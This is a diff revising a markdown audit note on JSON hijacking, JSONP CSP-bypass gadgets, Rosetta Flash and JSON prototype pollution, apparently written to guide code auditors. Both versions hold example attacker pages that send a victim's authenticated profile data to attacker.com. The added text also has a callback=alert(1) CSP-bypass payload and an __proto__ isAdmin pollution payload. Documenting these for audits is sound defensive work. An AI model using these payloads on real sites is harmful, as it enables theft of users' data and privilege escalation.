@@ -1,67 +1,104 @@
-# JSON Hijacking & Array Poisoning
+# JSON Hijacking, JSONP & Array Poisoning — Elite Protocol
 
-**Tags:** #medium #json #xss #data-exfiltration
-**OWASP:** A01:2021-Broken Access Control
-**CVSS Base:** 6.5 (Medium) — 7.5 (High if PII is leaked)
+> **Context:** Often dismissed as "legacy", JSONP hijacking remains active in enterprise applications with decade-old integrations. Beyond that, modern variants (CORS misconfigurations, JSONP gadgets in CSP bypass chains) give this attack surface new relevance.
 
----
-
-## 📖 What it is
-
-**JSON Hijacking:** In legacy browsers, JSON arrays returned as a top-level response could be intercepted by a malicious site using the `<script>` tag. Since `<script>` is cross-origin by design, the attacker's site can read the data by overriding the `Array` constructor or using proxies.
-
-**Modern Context:** While modern browsers prevent `Array` constructor poisoning, many applications still use **JSONP** (JSON with Padding) which remains inherently vulnerable to hijacking if not strictly restricted.
+**Tags:** #medium #json #jsonp #xss #data-exfiltration #csrf #csp-bypass
+**OWASP:** A01:2021 Broken Access Control / A05:2021 Security Misconfiguration
+**CVSS Base:** 6.5–8.1 (High when combined with authentication bypass)
 
 ---
 
-## 🔍 `grep_search` Tactics
+## Attack Surface Map
 
+### 1. Classic JSONP Hijacking (Still in Production)
+
+**How it works:** The API allows a caller to specify a JavaScript callback function name. The server wraps the response in that function call. A malicious site embeds this as a `<script>` tag — bypassing SOP.
+
+**Victim response (legitimate):**
 ```
-callback=
-jsonp
-.toJSON()
-JSON.stringify
-application/json
-Content-Type
+GET /api/profile?callback=processData
+→ processData({"name":"Pedro","email":"pedro@example.com"})
 ```
 
----
-
-## 💣 Attack Category 1: JSONP Hijacking
-
-**How it works:** The API returns data wrapped in a callback function specified by the user. An attacker site loads the API URL in a `<script>` tag and defines the callback to steal the data.
-
-**Attack:**
+**Attacker's malicious page:**
 ```html
-<!-- Malicious page on attacker.com -->
 <script>
-  function steal(data) {
-    fetch('https://attacker.com/collect?data=' + JSON.stringify(data));
+  function processData(data) {
+    navigator.sendBeacon("https://attacker.com/collect", JSON.stringify(data));
   }
 </script>
-<script src="https://target.com/api/user?callback=steal"></script>
+<script src="https://target.com/api/profile?callback=processData"></script>
+```
+
+The browser sends the victim's authenticated cookies with the `<script>` request. The attacker receives the full profile.
+
+**`grep_search`:** `callback=`, `jsonp`, `?cb=`, `?func=`, `res.jsonp(`, `echo $_GET['callback']`.
+
+---
+
+### 2. JSONP as a CSP Bypass Gadget (Modern Attack Vector)
+
+If the target application has a CSP of `script-src 'self' target.com`, and `target.com` hosts a JSONP endpoint, the attacker can inject a `<script src="https://target.com/api?callback=alert(1)//">`.
+
+**Detection:** Any JSONP endpoint on a domain that appears in a CSP `script-src` whitelist is a CSP bypass gadget.
+
+**`grep_search`:** CSP headers or `meta` tags. Cross-reference whitelisted origins with known JSONP endpoints.
+
+---
+
+### 3. Rosetta Flash (JSONP + Flash SOP Bypass — Legacy but Documented)
+
+If a JSONP endpoint allows arbitrary characters in the callback parameter (non-alphanumeric), the attacker can craft a callback that begins with valid ActionScript byte-code (which starts with `CWS` or `FWS`), making the browser interpret the JSONP response as a Flash file.
+
+**`grep_search`:** Verify if callback parameter is restricted to `[a-zA-Z0-9._]` only.
+
+---
+
+### 4. `__proto__` Poisoning via JSON.parse (Prototype Pollution via Deserialization)
+
+When a server-side library or client-side code uses `JSON.parse` on user input that contains prototype-polluting keys without sanitization:
+
+```javascript
+// Attacker submits:
+{"__proto__": {"isAdmin": true}}
+
+// Vulnerable merge:
+Object.assign(options, JSON.parse(userInput));
+// All subsequent objects created will have isAdmin = true
+```
+
+**`grep_search`:** `JSON.parse(req.body`, `JSON.parse(event.data`, `Object.assign(.*JSON.parse`. Check for absence of `json-flatten` or `@fastify/secure-json-parse`.
+
+---
+
+### 5. JSON Array Top-Level Response Leak (Legacy Browser Attack)
+
+Older browsers (IE6/7) allowed overriding the `Array` constructor, meaning any page serving a top-level JSON array could have its data intercepted.
+
+**Modern relevance:** While browser-side protections exist, servers that respond to auth-required endpoints with a bare array `[...]` instead of `{"data": [...]}` are still structurally broken and should be flagged.
+
+**`grep_search`:** Routes that return `Response(queryset, many=True)` (Django REST) or `res.json(array)` (Express) without a wrapper object.
+
+---
+
+## Chained Exploitation Paths
+
+```
+JSONP endpoint + CSP whitelist → CSP bypass → Unrestricted XSS
+JSONP + Authenticated session → Data exfiltration without any user interaction
+JSON prototype pollution + Template engine → RCE via polluted template context
+JSONP + Open Redirect → Callback URL bypass → Data exfiltration to attacker's real domain
 ```
 
 ---
 
-## 💣 Attack Category 2: Rosetta Flash (legacy but relevant)
-
-**How it works:** If an API allows a JSONP callback with arbitrary characters, an attacker can craft a callback that is actually valid ActionScript/Flash byte-code, allowing them to bypass CORS entirely.
-
----
-
-## 🛡️ Fix
-
-1. **Avoid JSONP:** Use CORS (`Access-Control-Allow-Origin`) instead.
-2. **Prevent Content-Type Sniffing:** Ensure `X-Content-Type-Options: nosniff` is present.
-3. **Use Object Literals:** Never return sensitive data as a top-level JSON Array. Use an object: `{"data": [...]}`.
-4. **CSRF Protection:** Ensure JSONP endpoints require a non-predictable CSRF token.
+## Strategic Checklist for Auditor
+1. [ ] Search all routes for JSONP patterns (`?callback=`, `?cb=`, `res.jsonp(`).
+2. [ ] Verify callback parameter is restricted to `[a-zA-Z0-9._$]`.
+3. [ ] Cross-reference JSONP endpoints with CSP whitelist (potential Script Gadget chain).
+4. [ ] Audit `Object.assign` / `_.merge` / `extend` calls with JSON-parsed user input.
+5. [ ] Check if API endpoints return bare JSON arrays instead of wrapped objects.
 
 ---
 
-## 🔗 Chain Exploits
-
-```
-JSON Hijacking + Sensitive PII ➔ Identity theft of logged-in users
-JSONP + XSS ➔ Bypassing CSP via JSONP callback gadgets
-```
+*Tags: #jsonp #json-hijacking #prototype-pollution #csp-bypass #data-exfiltration #shiva-vault*
